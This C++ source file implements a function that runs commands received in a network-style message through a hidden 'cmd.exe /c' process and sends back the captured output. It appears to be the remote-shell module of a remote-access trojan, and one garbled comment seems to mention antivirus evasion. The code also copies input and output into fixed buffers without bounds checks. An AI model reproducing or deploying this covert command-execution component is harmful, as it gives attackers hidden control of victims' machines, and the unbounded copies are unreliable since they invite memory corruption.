#include "StdAfx.h"
#include "DosShell.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

//���ܵ�Shell
void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead = NULL, hWrite = NULL;

	TCHAR Cmdline[256] = "cmd.exe /c ";
	char ReadBuf[1024] = { 0 };    //���ͻ���
	DWORD dwLen = 0, bytesRead = 0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//���������ܵ�,������ɱ
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		lpMsgHead->dwCmd = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if (hRead != NULL)
			CloseHandle(hRead);
		if (hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	StrNCat(Cmdline, pBuf, lpMsgHead->dwSize + 1);

	if (!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		lpMsgHead->dwCmd = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if (hRead != NULL)
			CloseHandle(hRead);
		if (hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	while (ReadFile(hRead, ReadBuf, 1024, &bytesRead, NULL))
	{
		memcpy(pBuf + dwLen, ReadBuf, bytesRead);
		dwLen += bytesRead;

		ZeroMemory(ReadBuf, 1024);

		Sleep(100);
	}

	lpMsgHead->dwCmd = 0;
	lpMsgHead->dwSize = dwLen;

	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);
}
